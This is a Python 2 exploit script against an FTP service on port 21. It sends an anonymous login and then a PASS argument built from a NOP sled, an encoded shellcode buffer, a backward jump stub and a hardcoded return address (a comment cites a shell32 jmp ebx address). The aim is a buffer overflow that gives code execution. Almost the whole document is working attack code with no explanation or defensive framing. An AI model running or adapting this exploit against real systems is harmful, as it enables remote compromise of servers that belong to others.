#!/bin/python
import socket, sys
import time

buf =  b""
buf += b"\xba\xc7\xfc\x12\x9e\xda\xd3\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x97\xf2\xf0"
buf += b"\x6b\xeb\xe3\x77\x93\x13\xf4\x17\x1d\xf6\xc5\x17\x79"
buf += b"\x73\x75\xa8\x09\xd1\x7a\x43\x5f\xc1\x09\x21\x48\xe6"
buf += b"\xba\x8c\xae\xc9\x3b\xbc\x93\x48\xb8\xbf\xc7\xaa\x81"
buf += b"\x0f\x1a\xab\xc6\x72\xd7\xf9\x9f\xf9\x4a\xed\x94\xb4"
buf += b"\x56\x86\xe7\x59\xdf\x7b\xbf\x58\xce\x2a\xcb\x02\xd0"
buf += b"\xcd\x18\x3f\x59\xd5\x7d\x7a\x13\x6e\xb5\xf0\xa2\xa6"
buf += b"\x87\xf9\x09\x87\x27\x08\x53\xc0\x80\xf3\x26\x38\xf3"
buf += b"\x8e\x30\xff\x89\x54\xb4\x1b\x29\x1e\x6e\xc7\xcb\xf3"
buf += b"\xe9\x8c\xc0\xb8\x7e\xca\xc4\x3f\x52\x61\xf0\xb4\x55"
buf += b"\xa5\x70\x8e\x71\x61\xd8\x54\x1b\x30\x84\x3b\x24\x22"
buf += b"\x67\xe3\x80\x29\x8a\xf0\xb8\x70\xc3\x35\xf1\x8a\x13"
buf += b"\x52\x82\xf9\x21\xfd\x38\x95\x09\x76\xe7\x62\x6d\xad"
buf += b"\x5f\xfc\x90\x4e\xa0\xd5\x56\x1a\xf0\x4d\x7e\x23\x9b"
buf += b"\x8d\x7f\xf6\x0c\xdd\x2f\xa9\xec\x8d\x8f\x19\x85\xc7"
buf += b"\x1f\x45\xb5\xe8\xf5\xee\x5c\x13\x9e\x1a\x5c\xe4\xf7"
buf += b"\x73\x9c\x1a\x09\x3f\x29\xfc\x63\x2f\x7c\x57\x1c\xd6"
buf += b"\x25\x23\xbd\x17\xf0\x4e\xfd\x9c\xf7\xaf\xb0\x54\x7d"
buf += b"\xa3\x25\x95\xc8\x99\xe0\xaa\xe6\xb5\x6f\x38\x6d\x45"
buf += b"\xf9\x21\x3a\x12\xae\x94\x33\xf6\x42\x8e\xed\xe4\x9e"
buf += b"\x56\xd5\xac\x44\xab\xd8\x2d\x08\x97\xfe\x3d\xd4\x18"
buf += b"\xbb\x69\x88\x4e\x15\xc7\x6e\x39\xd7\xb1\x38\x96\xb1"
buf += b"\x55\xbc\xd4\x01\x23\xc1\x30\xf4\xcb\x70\xed\x41\xf4"
buf += b"\xbd\x79\x46\x8d\xa3\x19\xa9\x44\x60\x39\x48\x4c\x9d"
buf += b"\xd2\xd5\x05\x1c\xbf\xe5\xf0\x63\xc6\x65\xf0\x1b\x3d"
buf += b"\x75\x71\x19\x79\x31\x6a\x53\x12\xd4\x8c\xc0\x13\xfd"

jmp = "\x83\xeb\x32" * 8
jmp += "\xff\xe3"

buffer = "\x90" * (1115 - len(buf)) + buf + "B" * (40 - len(jmp)) + jmp + "\x22\xe6\x01\x77"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
r = s.recv(4096)
time.sleep(2)
print r

s.send("USER anonymous\r\n")
r = s.recv(1024)
print r

s.send("PASS "+buffer+"\r\n")
r = s.recv(1024)
print r

s.send("pwd\r\n")
r = s.recv(1024)
print r

#shel32 jmp ebx 7701e622
